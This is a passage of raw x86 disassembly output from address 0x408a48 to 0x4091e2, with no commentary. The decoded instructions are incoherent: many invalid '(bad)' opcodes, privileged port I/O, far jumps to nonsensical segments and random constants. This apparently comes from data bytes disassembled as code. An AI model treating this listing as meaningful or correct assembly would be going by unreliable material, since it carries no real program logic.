  408a48:	je     0x408a17
  408a4a:	int3   
  408a4b:	mov    DWORD PTR [edi+0x4a],ebp
  408a4e:	ins    BYTE PTR es:[edi],dx
  408a4f:	push   0x9677438f
  408a54:	adc    al,0xd5
  408a56:	inc    esp
  408a57:	jnp    0x408a79
  408a59:	inc    esi
  408a5a:	push   esi
  408a5b:	fiadd  WORD PTR [esi-0xf]
  408a5e:	mov    dh,0x2
  408a60:	dec    ebx
  408a61:	mov    ds:0xc929692b,eax
  408a66:	cmp    eax,0xf7c6a406
  408a6b:	mov    esp,0xb9b5fdc8
  408a70:	gs add bh,cl
  408a73:	pop    ds
  408a74:	inc    ebp
  408a75:	or     ah,BYTE PTR [ecx+0x48]
  408a78:	loop   0x408a0a
  408a7a:	cld    
  408a7b:	aam    0xa4
  408a7d:	jns    0x408a2c
  408a7f:	out    0xb7,al
  408a81:	lods   eax,DWORD PTR ds:[esi]
  408a82:	pop    ebx
  408a83:	and    eax,0xe0a872ce
  408a88:	lock jle 0x408a27
  408a8b:	aas    
  408a8c:	ds inc ebx
  408a8e:	sbb    BYTE PTR [ebx+0x58],bl
  408a91:	outs   dx,DWORD PTR ds:[esi]
  408a92:	xlat   BYTE PTR ds:[ebx]
  408a93:	sbb    al,0x9a
  408a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a96:	test   al,0xab
  408a98:	nop
  408a99:	xlat   BYTE PTR ds:[ebx]
  408a9a:	int    0x7e
  408a9c:	neg    BYTE PTR [edi-0x3e]
  408a9f:	mov    eax,esp
  408aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aa2:	xor    eax,0x31a1591c
  408aa7:	mov    gs,WORD PTR [ebx+0x4b]
  408aaa:	les    ebp,FWORD PTR [edx-0x69744c47]
  408ab0:	push   0x186a281d
  408ab5:	loopne 0x408a3b
  408ab7:	xor    BYTE PTR [edx],bh
  408ab9:	mov    ebx,0x3215759e
  408abe:	bound  edx,QWORD PTR [ebx]
  408ac0:	xchg   ecx,eax
  408ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ac2:	jb     0x408aaf
  408ac4:	loop   0x408a57
  408ac6:	stos   DWORD PTR es:[edi],eax
  408ac7:	sbb    dh,BYTE PTR [edi-0x48]
  408aca:	lea    ebx,[esi+0xc72b7bd]
  408ad0:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ad2:	(bad)  
  408ad3:	std    
  408ad4:	mov    ah,0xf2
  408ad6:	(bad)  
  408ad7:	out    0xf8,al
  408ad9:	jnp    0x408acd
  408adb:	mov    al,ds:0x7e9868ba
  408ae0:	xor    BYTE PTR [ecx-0x491aec86],bh
  408ae6:	push   ebp
  408ae7:	push   0xffffffd1
  408ae9:	adc    ebx,ebp
  408aeb:	dec    esi
  408aec:	ins    BYTE PTR es:[edi],dx
  408aed:	xor    eax,DWORD PTR [ebp+0x6b]
  408af0:	icebp  
  408af1:	lahf   
  408af2:	ss ins DWORD PTR es:[edi],dx
  408af4:	imul   edi,edi,0x9e8f9597
  408afa:	fist   DWORD PTR [ebx-0x9f4cf56]
  408b00:	jp     0x408b57
  408b02:	sub    edx,DWORD PTR [ebx+0x6]
  408b05:	fs and ebp,eax
  408b08:	repnz xchg ebx,eax
  408b0a:	push   edx
  408b0b:	(bad)  
  408b0c:	sbb    DWORD PTR [edx-0x46],edx
  408b0f:	inc    edi
  408b10:	test   ch,bh
  408b12:	mov    al,0xdd
  408b14:	mov    ah,0x53
  408b16:	or     al,0x13
  408b18:	sbb    dh,BYTE PTR [ecx-0xb]
  408b1b:	in     eax,dx
  408b1c:	aam    0x71
  408b1e:	rol    esp,1
  408b20:	aam    0xa7
  408b22:	inc    esp
  408b23:	pop    edi
  408b24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b25:	ins    BYTE PTR es:[edi],dx
  408b26:	mov    al,ds:0x87b705ce
  408b2b:	mov    eax,ds:0x1eb4aaa9
  408b30:	jge    0x408b6e
  408b32:	(bad)  
  408b33:	das    
  408b34:	xlat   BYTE PTR ds:[ebx]
  408b35:	repz pop esi
  408b37:	cmp    BYTE PTR [esi+ebx*1+0x70982ee4],ch
  408b3e:	jmp    0x408b0c
  408b40:	push   ds
  408b41:	mov    edx,0xd21c0918
  408b46:	test   al,0xeb
  408b48:	call   0xd5e35bbf
  408b4d:	icebp  
  408b4e:	jmp    0xfa79005a
  408b53:	xchg   esp,eax
  408b54:	cmp    BYTE PTR [edx],0x19
  408b57:	fcomi  st,st(5)
  408b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b5a:	xor    esp,DWORD PTR [edx+0x318a79a3]
  408b60:	retf   0x95ed
  408b63:	loop   0x408bb3
  408b65:	jne    0x408b34
  408b67:	or     edx,edi
  408b69:	sbb    DWORD PTR [eax+ebx*8+0x7d],0x74
  408b6e:	jnp    0x408b3b
  408b70:	xor    al,0xde
  408b72:	push   ecx
  408b73:	and    DWORD PTR [ebp-0x390ffc0f],eax
  408b79:	pop    esp
  408b7a:	(bad)  [eax]
  408b7c:	(bad)  
  408b7d:	push   edi
  408b7e:	neg    DWORD PTR [ecx+0x5a]
  408b81:	in     al,0x80
  408b83:	je     0x408b07
  408b85:	imul   DWORD PTR [edi+0x7f429b45]
  408b8b:	adc    al,0xb3
  408b8d:	or     eax,0x8cff27b3
  408b92:	leave  
  408b93:	and    al,0xff
  408b95:	sub    eax,0x203079f3
  408b9a:	ins    DWORD PTR es:[edi],dx
  408b9b:	nop
  408b9c:	mov    ds:0xc9684a5c,eax
  408ba1:	sbb    ch,BYTE PTR [eax+ecx*4]
  408ba4:	aaa    
  408ba5:	in     al,dx
  408ba6:	mov    DWORD PTR [ebp+0x734a1436],esp
  408bac:	cmp    DWORD PTR [edi+ecx*8+0x39d68ba5],esp
  408bb3:	push   ds
  408bb4:	xchg   BYTE PTR [ebx+0x3e],ch
  408bb7:	xor    al,0x56
  408bb9:	pop    eax
  408bba:	and    al,0xb7
  408bbc:	xchg   DWORD PTR [eax-0x3b],ebp
  408bbf:	jo     0x408bf9
  408bc1:	shl    ebp,1
  408bc3:	test   BYTE PTR [edx-0x2f],bh
  408bc6:	xor    al,0x80
  408bc8:	fiadd  WORD PTR [eax+0x3270a3ff]
  408bce:	out    0xbb,eax
  408bd0:	mov    cl,0xe8
  408bd2:	push   ebp
  408bd3:	and    BYTE PTR [edi-0x72],dh
  408bd6:	std    
  408bd7:	jo     0x408b63
  408bd9:	mov    DWORD PTR [esi-0x2f],ebx
  408bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bdd:	sub    BYTE PTR es:[ebx+0x3b],cl
  408be1:	hlt    
  408be2:	rol    cl,0x4f
  408be5:	mov    ds:0xdae1cae3,eax
  408bea:	retf   
  408beb:	(bad)  
  408bec:	jge    0x408c03
  408bee:	hlt    
  408bef:	jns    0x408c19
  408bf1:	pop    edi
  408bf2:	or     edx,DWORD PTR [esi]
  408bf4:	jbe    0x408c5c
  408bf6:	cmp    al,0x9b
  408bf8:	fist   WORD PTR [edx-0x498d653b]
  408bfe:	mov    ah,0x7a
  408c00:	shr    ebp,cl
  408c02:	push   edi
  408c03:	and    al,ch
  408c05:	out    0xa7,eax
  408c07:	int    0x82
  408c09:	jmp    0xc82b4b2c
  408c0e:	cmp    al,0x92
  408c10:	mov    ch,0x41
  408c12:	mov    bl,0xc1
  408c14:	pop    eax
  408c15:	lea    ecx,[edx]
  408c17:	out    0x26,eax
  408c19:	sbb    BYTE PTR [edi],bl
  408c1b:	fwait
  408c1c:	and    DWORD PTR [ebx+0x3fa8ab9b],0x5b
  408c23:	sub    DWORD PTR [ebx-0x358837f],ebp
  408c29:	aam    0x37
  408c2b:	arpl   WORD PTR [edx],ax
  408c2d:	out    dx,eax
  408c2e:	mov    al,0x73
  408c30:	xor    bl,BYTE PTR [ebp+eax*4-0x176660b7]
  408c37:	jne    0x408bd5
  408c39:	pop    ecx
  408c3a:	or     dl,BYTE PTR [esi+0x49]
  408c3d:	mov    eax,ds:0x1a91187c
  408c42:	mov    ch,0x77
  408c44:	pop    ebp
  408c45:	add    DWORD PTR [ebx],0x18
  408c48:	dec    ebx
  408c49:	daa    
  408c4a:	cmp    al,0xc8
  408c4c:	test   BYTE PTR [esi],cl
  408c4e:	push   ss
  408c4f:	sbb    eax,DWORD PTR [edi-0x5b]
  408c52:	xchg   esp,eax
  408c53:	arpl   WORD PTR [eax+0x4d8dbc01],sp
  408c59:	lea    eax,[edi+0x12]
  408c5c:	aam    0xb
  408c5e:	pop    edx
  408c5f:	adc    eax,DWORD PTR [ecx]
  408c61:	cwde   
  408c62:	pop    edi
  408c63:	adc    eax,0x81ef79c2
  408c68:	dec    ebp
  408c69:	xchg   BYTE PTR [edx+0x7a1e9f41],bh
  408c6f:	mov    edi,0x308d414b
  408c74:	push   ss
  408c75:	out    0xb5,eax
  408c77:	aaa    
  408c78:	iretw  
  408c7a:	inc    edx
  408c7b:	mov    ds:0x987b6c29,eax
  408c80:	cld    
  408c81:	inc    eax
  408c82:	in     al,0x22
  408c84:	jnp    0x408c29
  408c86:	loopne 0x408cc3
  408c88:	or     al,0x17
  408c8a:	inc    ecx
  408c8b:	mov    ebp,0x160e98d6
  408c90:	popa   
  408c91:	jmp    0x408ce3
  408c93:	pop    ecx
  408c94:	popf   
  408c95:	xchg   esi,eax
  408c96:	inc    ebx
  408c97:	xchg   esp,eax
  408c98:	out    0xd4,al
  408c9a:	jp     0x408c89
  408c9c:	adc    eax,0xfec45655
  408ca1:	cmp    eax,0x9080ad25
  408ca6:	imul   bh
  408ca8:	rcl    DWORD PTR [esi-0x2ab146ec],0xa
  408caf:	fld    DWORD PTR [esi+0x6652af35]
  408cb5:	mov    ecx,0x27448150
  408cba:	mov    al,0x23
  408cbc:	(bad)  
  408cc0:	or     al,0xc1
  408cc2:	jl     0x408c75
  408cc4:	in     eax,dx
  408cc5:	test   DWORD PTR [ecx+0xd],edx
  408cc8:	test   eax,0x75ae7161
  408ccd:	xor    al,0x8d
  408ccf:	(bad)  
  408cd0:	cli    
  408cd1:	mov    ds:0xbf6a82aa,eax
  408cd6:	mov    ds:0x8cb25caf,eax
  408cdb:	lock daa 
  408cdd:	mov    cl,0xe4
  408cdf:	jno    0x408c9e
  408ce1:	jmp    0x408cfb
  408ce3:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408ce5:	test   al,0x67
  408ce7:	fist   DWORD PTR [ecx+0x5a]
  408cea:	mov    DWORD PTR [esi+0x31],edi
  408ced:	jmp    0xe714:0xc0b0aee2
  408cf4:	lea    esi,[edx]
  408cf6:	sbb    eax,0xaa51bc05
  408cfb:	jno    0x408cc7
  408cfd:	or     al,0x46
  408cff:	push   es
  408d00:	sbb    eax,0x7a317ffc
  408d05:	inc    edx
  408d06:	pop    edx
  408d07:	jo     0x408d51
  408d09:	adc    BYTE PTR [edi-0x73994eb0],al
  408d0f:	jmp    0x9abd:0x8d1afae3
  408d16:	dec    ecx
  408d17:	jnp    0x408d56
  408d19:	loope  0x408d46
  408d1b:	jo     0x408d70
  408d1d:	xchg   esi,eax
  408d1e:	outs   dx,BYTE PTR ds:[esi]
  408d1f:	pushf  
  408d20:	and    al,0xb9
  408d22:	lods   al,BYTE PTR ds:[esi]
  408d23:	mov    bl,0x7c
  408d25:	ins    BYTE PTR es:[edi],dx
  408d26:	push   0xaefaf42a
  408d2b:	sti    
  408d2c:	sub    dl,BYTE PTR [esi]
  408d2e:	xchg   DWORD PTR [esi],ebp
  408d30:	sbb    al,0xc3
  408d32:	leave  
  408d33:	outs   dx,BYTE PTR ds:[esi]
  408d34:	xor    DWORD PTR [eax+0x3a899eb0],esp
  408d3a:	das    
  408d3b:	pop    ss
  408d3c:	aaa    
  408d3d:	lods   eax,DWORD PTR ds:[esi]
  408d3e:	push   es
  408d3f:	pop    es
  408d40:	mov    ds:0xd27252fa,al
  408d45:	or     al,0xa0
  408d47:	sub    ch,BYTE PTR [ebx-0x3]
  408d4a:	sbb    ecx,edi
  408d4c:	retf   
  408d4d:	mov    WORD PTR [ebp+0x4],?
  408d50:	cli    
  408d51:	mov    edx,0x62647502
  408d56:	and    ebx,edi
  408d58:	xor    eax,0x54de6b9e
  408d5d:	push   esi
  408d5e:	shl    BYTE PTR [ebx+0x4f],0x8a
  408d62:	mov    ebx,0x94ba963e
  408d67:	pop    ss
  408d68:	sbb    ah,dh
  408d6a:	mov    al,ch
  408d6c:	aaa    
  408d6d:	lea    ecx,[edi-0x7]
  408d70:	sbb    edi,DWORD PTR [edx-0x71]
  408d73:	jo     0x408d7e
  408d75:	js     0x408dc5
  408d77:	push   DWORD PTR [ecx]
  408d79:	fst    QWORD PTR [ecx]
  408d7b:	call   0xdb00ea05
  408d80:	and    DWORD PTR [ebp-0x7e],ecx
  408d83:	xor    DWORD PTR [eax],ecx
  408d85:	mov    ebx,0x296aaa
  408d8a:	mov    ebx,0x751ea11a
  408d8f:	mov    eax,ds:0x79d8eb27
  408d94:	sar    ebx,0x5e
  408d97:	fdiv   QWORD PTR [ebx]
  408d99:	or     al,dl
  408d9b:	adc    eax,0xe2e3d131
  408da0:	scas   eax,DWORD PTR es:[edi]
  408da1:	out    0xc2,al
  408da3:	push   0x2be9dae0
  408da8:	cmp    dh,BYTE PTR ss:[esi+edi*8]
  408dac:	icebp  
  408dad:	sti    
  408dae:	xor    eax,0x7c889280
  408db3:	loop   0x408d6d
  408db5:	pushf  
  408db6:	icebp  
  408db7:	dec    edi
  408db8:	test   DWORD PTR [eax+0x1488552c],0xb441b365
  408dc2:	pop    edx
  408dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dc4:	pop    ss
  408dc5:	ja     0x408ddf
  408dc7:	push   esp
  408dc8:	lahf   
  408dc9:	clc    
  408dca:	arpl   WORD PTR [ecx+0x1f4f5455],bx
  408dd0:	clc    
  408dd1:	inc    edi
  408dd2:	jg     0x408dba
  408dd4:	push   ds
  408dd5:	pop    edi
  408dd6:	fbstp  TBYTE PTR [ebp+0x6]
  408dd9:	es neg edx
  408ddc:	ins    DWORD PTR es:[edi],dx
  408ddd:	call   0x15bc8207
  408de2:	out    dx,eax
  408de3:	and    ebx,esp
  408de5:	xchg   ah,al
  408de7:	jno    0x408e0e
  408de9:	rcr    DWORD PTR [ebp+ebx*1+0xa],cl
  408ded:	loope  0x408d6f
  408def:	sub    al,0x1b
  408df1:	pop    esi
  408df2:	stos   BYTE PTR es:[edi],al
  408df3:	call   0xd94a8f9e
  408df8:	cli    
  408df9:	js     0x408d93
  408dfb:	add    esi,DWORD PTR [edx+0x36]
  408dfe:	clc    
  408dff:	adc    cl,dh
  408e01:	cdq    
  408e02:	mov    bl,dh
  408e04:	lods   eax,DWORD PTR ds:[esi]
  408e05:	sbb    dh,0x8
  408e08:	arpl   WORD PTR [ecx+eax*2],ax
  408e0b:	ss push cs
  408e0d:	sar    BYTE PTR [ebx],cl
  408e0f:	lea    ebx,[edi]
  408e11:	mov    ds,eax
  408e13:	adc    ebx,esp
  408e15:	dec    ecx
  408e16:	xchg   esi,edi
  408e18:	push   ebp
  408e19:	xor    eax,0x7819d494
  408e1e:	xor    eax,0x68731439
  408e23:	or     cl,BYTE PTR [ebp-0x29]
  408e26:	xchg   ebx,eax
  408e27:	adc    esi,0x54f169c8
  408e2d:	or     al,0xb1
  408e2f:	mov    eax,0x63077217
  408e34:	je     0x408e85
  408e36:	mov    edx,0xb9b4a0d8
  408e3b:	jne    0x408eb1
  408e3d:	add    bh,BYTE PTR [ebx-0x255a2ab4]
  408e43:	sub    al,0xe6
  408e45:	inc    esp
  408e46:	popf   
  408e47:	mov    ds:0x810b33a9,eax
  408e4c:	dec    ebp
  408e4d:	push   0x3cb37b76
  408e52:	xchg   BYTE PTR [ecx-0x59445423],bl
  408e58:	shr    BYTE PTR [edi-0x59],0x72
  408e5c:	push   ebp
  408e5d:	inc    eax
  408e5e:	rcr    DWORD PTR [eax-0x3d],1
  408e61:	lea    eax,[ecx-0x51d941d6]
  408e67:	retf   
  408e68:	scas   eax,DWORD PTR es:[edi]
  408e69:	jae    0x408e61
  408e6b:	div    eax
  408e6d:	in     eax,0x44
  408e6f:	dec    esp
  408e70:	or     al,0x1d
  408e72:	gs into 
  408e74:	jae    0x408eb6
  408e76:	mov    edx,DWORD PTR [edi-0x75]
  408e79:	mov    al,0xf6
  408e7b:	aaa    
  408e7c:	mov    bl,dl
  408e7e:	jp     0x408ec8
  408e80:	loope  0x408ef4
  408e82:	xor    edi,edx
  408e84:	mov    BYTE PTR [ecx+0x17],ah
  408e87:	xchg   ecx,eax
  408e88:	push   cs
  408e89:	jmp    0xc6ae48b7
  408e8e:	cmp    al,0xdc
  408e90:	sbb    al,BYTE PTR [edx]
  408e92:	dec    esp
  408e93:	jg     0x408eb8
  408e95:	or     BYTE PTR [ecx],bh
  408e97:	inc    ecx
  408e98:	test   DWORD PTR [edi],0x36a21e81
  408e9e:	sahf   
  408e9f:	inc    ebx
  408ea0:	and    esp,0x4f
  408ea3:	mov    dh,0x5b
  408ea5:	mov    esi,0xbec29b44
  408eaa:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eac:	fucom  st(5)
  408eae:	scas   eax,DWORD PTR es:[edi]
  408eaf:	xchg   ebp,eax
  408eb0:	jg     0x408ed5
  408eb2:	nop
  408eb3:	sar    cl,0x28
  408eb6:	add    al,0x29
  408eb8:	dec    edi
  408eb9:	dec    ebp
  408eba:	cdq    
  408ebb:	mov    dh,0xe3
  408ebd:	and    al,0xa2
  408ebf:	jmp    0x207edb97
  408ec4:	sahf   
  408ec5:	pop    edx
  408ec6:	add    DWORD PTR ds:[ecx+0x66814ffc],esp
  408ecd:	sahf   
  408ece:	loope  0x408e96
  408ed0:	adc    eax,0x92e1d851
  408ed5:	xchg   edx,eax
  408ed6:	int    0x76
  408ed8:	enter  0xbd2a,0xfb
  408edc:	cmc    
  408edd:	lahf   
  408ede:	mov    ch,0xe6
  408ee0:	in     eax,dx
  408ee1:	lds    edi,FWORD PTR [ebp-0xf]
  408ee4:	hlt    
  408ee5:	ja     0x408e72
  408ee7:	daa    
  408ee8:	jle    0x408ec2
  408eea:	out    dx,al
  408eeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eec:	es das 
  408eee:	push   esp
  408eef:	sar    BYTE PTR [ecx],1
  408ef1:	mov    eax,ds:0x74185ea7
  408ef6:	sub    eax,0xe52c442d
  408efb:	xchg   esi,eax
  408efc:	lods   eax,DWORD PTR ds:[esi]
  408efd:	add    ebx,DWORD PTR [esi]
  408eff:	inc    esp
  408f00:	pusha  
  408f01:	jne    0x408e9a
  408f03:	mov    ch,0xab
  408f05:	sbb    al,0x8
  408f07:	das    
  408f08:	mov    ecx,0x439ae521
  408f0d:	ret    
  408f0e:	pop    ss
  408f0f:	lds    esi,FWORD PTR [edi]
  408f11:	int3   
  408f12:	sub    BYTE PTR [esi+0x1a],bl
  408f15:	mov    edx,0x7e399d9d
  408f1a:	cmc    
  408f1b:	and    eax,0xb14fc25f
  408f20:	outs   dx,DWORD PTR ds:[esi]
  408f21:	jge    0x408f81
  408f23:	loopne 0x408f8c
  408f25:	xchg   DWORD PTR [edx],edx
  408f27:	jb     0x408ef3
  408f29:	les    ebp,FWORD PTR [edi+ebx*2+0x1f]
  408f2d:	shr    DWORD PTR [ebx+0x1a9d6577],1
  408f33:	mov    edi,0x33109b4d
  408f38:	push   cs
  408f39:	jle    0x408f43
  408f3b:	xchg   ebp,eax
  408f3c:	xor    BYTE PTR [edi+0x6a4f5a73],ch
  408f42:	cmp    DWORD PTR [edx],esp
  408f44:	xchg   DWORD PTR [edx-0x7d665bb2],esi
  408f4a:	sub    ch,BYTE PTR [esi-0x3]
  408f4d:	mov    ds:0xae2da4b5,al
  408f52:	push   ds
  408f53:	push   ebx
  408f54:	push   cs
  408f55:	repz pushf 
  408f57:	iret   
  408f58:	inc    edi
  408f59:	jmp    0x345c6809
  408f5e:	rcl    BYTE PTR [ebx],0xbc
  408f61:	mov    ebp,0x2ffcd4f4
  408f66:	aas    
  408f67:	lods   eax,DWORD PTR ds:[esi]
  408f68:	fistp  QWORD PTR [ebx+eax*1+0x89e9796]
  408f6f:	xchg   esp,eax
  408f70:	ror    DWORD PTR [ebx],cl
  408f72:	mov    esi,DWORD PTR [ecx-0x167751b5]
  408f78:	xor    al,0x6d
  408f7a:	jmp    FWORD PTR ss:[eax-0x4400ba10]
  408f81:	inc    edx
  408f82:	sub    BYTE PTR [eax],bh
  408f84:	cmp    al,0x66
  408f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f87:	mov    al,BYTE PTR [edi-0x20661b78]
  408f8d:	das    
  408f8e:	int3   
  408f8f:	cwde   
  408f90:	sub    cl,ch
  408f92:	icebp  
  408f93:	sbb    esp,DWORD PTR [esp+ecx*4-0x57]
  408f97:	mov    si,0xb01a
  408f9b:	xchg   si,ax
  408f9d:	imul   esi,DWORD PTR [ebx+0x42],0x37
  408fa1:	jecxz  0x408f7a
  408fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fa5:	xchg   ebx,eax
  408fa6:	retf   0xcf75
  408fa9:	outs   dx,DWORD PTR ds:[esi]
  408faa:	push   esi
  408fab:	sub    esp,DWORD PTR [ebp+0x7c]
  408fae:	push   ss
  408faf:	cmc    
  408fb0:	sbb    ecx,DWORD PTR [ebp-0x2cb7f4dc]
  408fb6:	sahf   
  408fb7:	mov    al,0xe1
  408fb9:	mov    ch,0x24
  408fbb:	push   ecx
  408fbc:	mov    ebp,0xde568b58
  408fc1:	push   ss
  408fc2:	ror    DWORD PTR [edi-0x1aa3e66e],1
  408fc8:	dec    eax
  408fc9:	les    eax,FWORD PTR [edi]
  408fcb:	or     BYTE PTR [edi-0x71],0xac
  408fcf:	sahf   
  408fd0:	pop    ecx
  408fd1:	imul   ebx,DWORD PTR [edx-0x6f],0x25f53e96
  408fd8:	dec    dh
  408fda:	into   
  408fdb:	cld    
  408fdc:	adc    edi,DWORD PTR [ecx+0x620551ee]
  408fe2:	push   ebp
  408fe3:	jge    0x40900e
  408fe5:	dec    ecx
  408fe6:	jns    0x409000
  408fe8:	sbb    DWORD PTR [eax+0x4c],ebp
  408feb:	or     eax,0x1ceeba5
  408ff0:	rcr    edi,1
  408ff2:	cwde   
  408ff3:	cmp    BYTE PTR [esi+0x4a],cl
  408ff6:	leave  
  408ff7:	pop    ecx
  408ff8:	pop    esi
  408ff9:	outs   dx,DWORD PTR ds:[esi]
  408ffa:	cs cs in al,0x3d
  408ffe:	cmp    bl,ah
  409000:	arpl   ax,cx
  409002:	fcomp  QWORD PTR [edi+0x4a7df7c6]
  409008:	pop    esi
  409009:	or     eax,0xc06c0b6b
  40900e:	(bad)
  409011:	ror    BYTE PTR [edx-0x4b],1
  409014:	imul   DWORD PTR [eax+0x4d]
  409017:	icebp  
  409018:	cmp    DWORD PTR [edx-0x4ab7bf34],esi
  40901e:	adc    eax,0x3d2a9df6
  409023:	add    al,0xcb
  409025:	push   ss
  409026:	push   es
  409027:	fwait
  409028:	dec    ebp
  409029:	mov    eax,ds:0xc04e9fe4
  40902e:	pop    ds
  40902f:	pop    edx
  409030:	aaa    
  409031:	lock adc cl,BYTE PTR [ecx+0x14]
  409035:	jle    0x408fc3
  409037:	cmc    
  409038:	retf   
  409039:	ficomp WORD PTR [ebp+0x4e991ef0]
  40903f:	jb     0x409093
  409041:	pushf  
  409042:	or     eax,0x43caa670
  409047:	sbb    eax,0xb75c77fd
  40904c:	repnz stos DWORD PTR es:[edi],eax
  40904e:	pusha  
  40904f:	test   BYTE PTR [ebp-0x36],0xd3
  409053:	mov    ebp,0x4b94d1c7
  409058:	sbb    esp,DWORD PTR [edi+0x75]
  40905b:	sub    eax,0x7d9f90ed
  409060:	dec    edi
  409061:	(bad)  
  409062:	jp     0x409011
  409064:	inc    edx
  409065:	repnz lea esp,[eax+0x39]
  409069:	add    BYTE PTR [esi-0x6d86683b],al
  40906f:	arpl   WORD PTR [eax],si
  409071:	mov    DWORD PTR [ecx],esp
  409073:	les    ebx,FWORD PTR [ebx]
  409075:	mov    bl,0x3a
  409077:	mov    ds:0xc6589dea,eax
  40907c:	push   0x63
  40907e:	lods   al,BYTE PTR ds:[esi]
  40907f:	sub    al,0x82
  409081:	cmp    ecx,eax
  409083:	stos   DWORD PTR es:[edi],eax
  409084:	jae    0x40902a
  409086:	mov    ah,0x95
  409088:	mov    ebp,0xa68d6f28
  40908d:	(bad)  
  40908e:	fsub   DWORD PTR [ecx+0x6f]
  409091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409092:	cli    
  409093:	mov    edx,0x1cc12344
  409098:	(bad)
  40909b:	push   eax
  40909c:	pop    ebp
  40909d:	cmp    al,0xf
  40909f:	mov    dl,0xb4
  4090a1:	aam    0x9c
  4090a3:	out    0xf0,al
  4090a5:	mov    ch,0x5b
  4090a7:	push   0x59
  4090a9:	pop    ebx
  4090aa:	inc    esi
  4090ab:	ja     0x409100
  4090ad:	ret    0x4910
  4090b0:	mov    ebp,0x94e28fc1
  4090b5:	lds    ebx,FWORD PTR [ecx+edx*4-0xf7709a5]
  4090bc:	mov    ecx,0xdffc6bc
  4090c1:	ins    BYTE PTR es:[edi],dx
  4090c2:	out    0x6d,al
  4090c4:	fsubrp st(2),st
  4090c6:	xchg   bh,ch
  4090c8:	sahf   
  4090c9:	mov    ah,0x49
  4090cb:	sbb    DWORD PTR [ecx],0x75dbf860
  4090d1:	mov    ds:0x8178795c,al
  4090d6:	pop    eax
  4090d7:	dec    edx
  4090d8:	jmp    0x240:0x9448ed52
  4090df:	push   eax
  4090e0:	test   DWORD PTR [eax-0x1],0xb9ffc94b
  4090e7:	xchg   edi,eax
  4090e8:	adc    BYTE PTR [eax],0xbb
  4090eb:	cmp    bl,BYTE PTR [edi-0x45]
  4090ee:	mov    ebp,0xfc69ed52
  4090f3:	jg     0x409161
  4090f5:	pop    es
  4090f6:	cs add eax,0xb82cae81
  4090fc:	xor    BYTE PTR [esi],bl
  4090fe:	jmp    0xe81b:0x9ab0b94b
  409105:	mov    ah,dh
  409107:	pusha  
  409108:	jg     0x4090cc
  40910a:	hlt    
  40910b:	adc    al,BYTE PTR [ebx-0x39be5faf]
  409111:	cmc    
  409112:	xchg   ecx,eax
  409113:	ret    0xbeae
  409116:	dec    edx
  409117:	cli    
  409118:	xchg   ecx,eax
  409119:	push   ss
  40911a:	(bad)  
  40911b:	outs   dx,DWORD PTR ds:[esi]
  40911c:	jmp    0xb9f:0xf95c6db4
  409123:	shl    BYTE PTR [ebp+0x236e3644],0x52
  40912a:	xor    DWORD PTR [eax],ebp
  40912c:	sub    edi,DWORD PTR [eax+0xf242ec2]
  409132:	ja     0x409192
  409134:	mov    bh,0xdd
  409136:	sub    edi,DWORD PTR [eax]
  409138:	mov    ecx,0x4444839d
  40913d:	shr    DWORD PTR [ebx-0x4fa9b306],1
  409143:	lahf   
  409144:	or     edi,DWORD PTR [ebp-0x65]
  409147:	pop    esp
  409148:	sti    
  409149:	and    DWORD PTR [edi-0x2a9bc789],edi
  40914f:	cmp    edi,esp
  409151:	mov    edx,0xb100f8c6
  409156:	sbb    al,0x6
  409158:	adc    DWORD PTR [ecx],esi
  40915a:	dec    esi
  40915b:	mov    DWORD PTR ds:0x9347bdb0,eax
  409161:	mov    ah,0xa9
  409163:	repz mov ?,WORD PTR [ecx+0x76]
  409167:	mov    al,0x79
  409169:	ja     0x40914f
  40916b:	ret    
  40916c:	mov    edx,0xf617e31c
  409171:	mov    ecx,0x4b0648dc
  409176:	or     bl,BYTE PTR [ebx-0x48]
  409179:	sbb    eax,0x6704eab0
  40917e:	gs cli 
  409180:	cld    
  409181:	mov    bl,al
  409183:	pushf  
  409184:	mov    bl,0x8d
  409186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409187:	jl     0x4091a5
  409189:	pop    ss
  40918a:	cmp    al,0x63
  40918c:	(bad)  
  40918d:	or     ah,BYTE PTR [ebx-0x1b066479]
  409193:	mov    ah,0x7a
  409195:	int3   
  409196:	popa   
  409197:	and    dl,dl
  409199:	mov    ah,0x16
  40919b:	stos   BYTE PTR es:[edi],al
  40919c:	mov    eax,ds:0xef400e3d
  4091a1:	fwait
  4091a2:	in     al,0xf0
  4091a4:	out    dx,al
  4091a5:	dec    ecx
  4091a6:	clc    
  4091a7:	rcl    DWORD PTR [ebx-0x25d49133],0x5f
  4091ae:	aaa    
  4091af:	inc    esi
  4091b0:	cwde   
  4091b1:	pushf  
  4091b2:	mov    ds:0x4231242d,eax
  4091b7:	mov    fs,WORD PTR [eax+0x34]
  4091ba:	fwait
  4091bb:	mov    fs,esi
  4091bd:	xor    ah,ah
  4091bf:	je     0x4091f3
  4091c1:	retf   
  4091c2:	popa   
  4091c3:	ins    DWORD PTR es:[edi],dx
  4091c4:	sti    
  4091c5:	fild   DWORD PTR [edx-0x42]
  4091c8:	shl    DWORD PTR [edx],0xe8
  4091cb:	xlat   BYTE PTR ds:[ebx]
  4091cc:	mov    ecx,0x523dd1c8
  4091d1:	outs   dx,BYTE PTR ds:[esi]
  4091d2:	lods   al,BYTE PTR ds:[esi]
  4091d3:	cwde   
  4091d4:	and    ecx,DWORD PTR [ecx+esi*4+0x6d]
  4091d8:	mov    ch,0x44
  4091da:	retf   0x1e24
  4091dd:	add    dh,BYTE PTR [edx]
  4091df:	dec    ebx
  4091e0:	loopne 0x409217
  4091e2:	mov    al,0xdb
